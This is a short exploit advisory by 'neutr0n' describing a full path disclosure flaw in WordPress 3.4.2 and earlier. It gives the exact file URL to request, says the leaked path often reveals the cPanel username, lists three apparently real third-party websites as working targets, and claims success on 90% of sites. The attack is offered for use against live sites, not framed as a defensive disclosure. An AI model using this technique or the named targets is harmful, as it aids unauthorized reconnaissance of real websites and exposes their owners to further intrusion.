title: Wordpress 3.4.2 Full Path Disclosure Vulnerability
author: neutr0n
cves: 

The Full Path Disclosure is in Wordpress <= 3.4.2, with this information you can get the path to the site you're in and (in most of the cases) cpanel's username.
 
To see it go to:
 
http://[path]/wp-includes/rss-functions.php
 

Examples:
http://tsmp.us/wp-includes/rss-functions.php
http://tafeio.com/wp-includes/rss-functions.php
http://santana1540.com.br/wp-includes/rss-functions.php

It works in 90% of the websites
